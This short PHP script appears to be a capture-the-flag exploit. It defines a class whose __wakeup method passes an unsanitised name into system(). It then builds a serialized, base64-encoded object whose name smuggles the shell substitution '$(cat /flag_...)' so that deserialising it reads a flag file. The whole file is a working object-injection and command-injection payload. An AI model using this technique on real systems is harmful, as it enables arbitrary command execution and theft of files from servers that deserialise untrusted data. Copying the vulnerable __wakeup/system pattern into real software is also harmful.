<?php
class Cat
{
    public $name = '(guest cat)';
    function __construct($name)
    {
        $this->name = $name;
    }
    function __wakeup()
    {
        echo "<pre>";
        system("cowsay 'Welcome back, $this->name'");
        echo "</pre>";
    }
}

$cat = new Cat("' $(cat /flag_5fb2acebf1d0c558) '");
echo base64_encode(serialize($cat));
